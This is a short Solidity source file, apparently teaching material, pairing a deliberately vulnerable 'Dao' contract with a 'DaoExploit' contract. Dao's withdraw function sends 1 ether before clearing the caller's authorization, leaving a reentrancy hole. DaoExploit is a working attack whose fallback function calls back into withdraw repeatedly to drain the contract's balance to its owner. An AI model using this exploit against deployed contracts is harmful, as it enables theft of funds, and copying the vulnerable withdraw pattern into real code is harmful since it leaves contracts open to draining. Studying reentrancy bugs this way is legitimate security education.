pragma solidity 0.4.24;

contract Dao {
    
    mapping(address => bool) public authorized;
    address public owner;
    
    constructor() public {
        owner = msg.sender;
    }
    
    // allows an authorized account to withdraw 1 ETH
    function withdraw() public {
        if(authorized[msg.sender] && address(this).balance >= 1 ether) {
            msg.sender.call.value(1 ether)();
        }
        authorized[msg.sender] = false;
    }
    
    // authorizes an account to withdraw 1 ETH
    function authorize(address who) public {
        require(msg.sender == owner);
        authorized[who] = true;
    }
    
    // so that this can accept ether
    function() public payable {
    }
    
    // auxilliary method for reading the balance
    function getBalance() public view returns (uint256) {
        return address(this).balance;
    }
}

contract DaoExploit {
    
    address owner;
    Dao dao;
    
    constructor(address _dao) public {
        owner = msg.sender;
        dao = Dao(_dao);
    }
    
    function withdraw() public {
        require(msg.sender == owner);
        msg.sender.call.value(address(this).balance)();
    }
    
    function attack() public payable {
        dao.withdraw();
    }
    
    function() public payable {
        dao.withdraw();
    }
}
